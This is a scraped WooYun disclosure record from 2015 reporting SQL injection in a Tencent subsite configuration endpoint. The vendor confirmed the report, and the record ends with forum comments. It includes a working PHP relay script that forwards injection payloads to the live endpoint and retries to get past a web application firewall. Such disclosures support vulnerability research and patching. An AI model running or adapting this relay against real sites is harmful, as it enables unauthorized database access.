{"id": 7479, "wybug_id": "wooyun-2015-0122960", "wybug_title": "腾讯某分站另一处SQL注入(附过waf转发脚本)", "wybug_corp": "腾讯", "wybug_author": "Jannock", "wybug_date": "2015-06-26 17:06", "wybug_open_date": "2015-08-10 17:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-10：\t细节向公众公开  简要描述： 腾讯某分站另一处SQL注入(附过waf转发脚本) 详细说明：  http://gad.qq.com/config/GetConfigListPOSTparentId=0&type=1两渗数都存在SQL注入   漏洞证明：  本地转发脚本\n<?phperror_reporting(0);ini_set('max_execution_time', 0);header(\"Content-Type: text/html; charset=UTF-8\");$a= urlencode(stripslashes($_GET['s']));$a  = str_replace('+',\"%20\",$a);$data = \"parentId=0&type=\".$a;do{$output= request_by_other($data);}while($output==\"\" || strstr($output,\"Implemented\"));echo $output;function request_by_other($post_string){    $context = array(        'http' => array(            'method' => 'POST',            'header' => 'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0' .                        \"\\r\\n\".'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' .                        \"\\r\\n\".'X-Requested-With: XMLHttpRequest'.\"\\r\\n\".'Content-length:' . strlen($post_string),            'content' => $post_string)        );    $stream_context = stream_context_create($context);    $data = file_get_contents(\"http://gad.qq.com/config/GetConfigList\", false, $stream_context);    $data = $http_response_header[0].$data;    return $data;} ?>\n\n\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-26 17:27 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-26 17:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  哇！    \n     2015-06-26 17:46 |    \t\tLooke \t\t\t( 普通白帽子  |\t\t\t        Rank:619 漏洞数:93        | 可顺势而为，何必逆水行舟)\t\t \n  前排留名    \n     2015-06-26 17:54 |    \t\t孤独雪狼 \t\t\t( 普通白帽子  |\t\t\t        Rank:710 漏洞数:145        | 七夕手机被偷，这坑爹的七夕啊 。。。。)\t\t \n  前排留名    \n     2015-06-26 18:04 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  前排留名    \n     2015-06-26 18:05 |    \t\t呼呼大侠 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 一只默默学习的菜菜)\t\t \n  前排留名    \n     2015-06-26 18:33 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  前排留名    \n     2015-06-26 18:38 |    \t\t狼牙月 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 水不撩怎知深浅 人不拼怎知输赢)\t\t \n  永远的一哥！    \n     2015-06-26 18:43 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  一哥牛逼    \n     2015-06-26 19:01 |    \t\t举起手来 \t\t\t( 普通白帽子  |\t\t\t        Rank:479 漏洞数:50        | 准备好，举起手来！)\t\t \n  一哥牛逼     \n     2015-06-27 04:37 |    \t\tTren \t\t\t( 实习白帽子  |\t\t\t        Rank:71 漏洞数:28        | 求带求装B)\t\t \n  一哥牛逼    \n     2015-06-29 12:00 |    \t\t恋锋 \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:42        | 为了成为一名优秀的白帽子而继续努力！)\t\t \n  一哥牛逼    \n     2015-08-13 07:54 |    \t\tkeny \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:21        )\t\t \n  一哥牛逼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}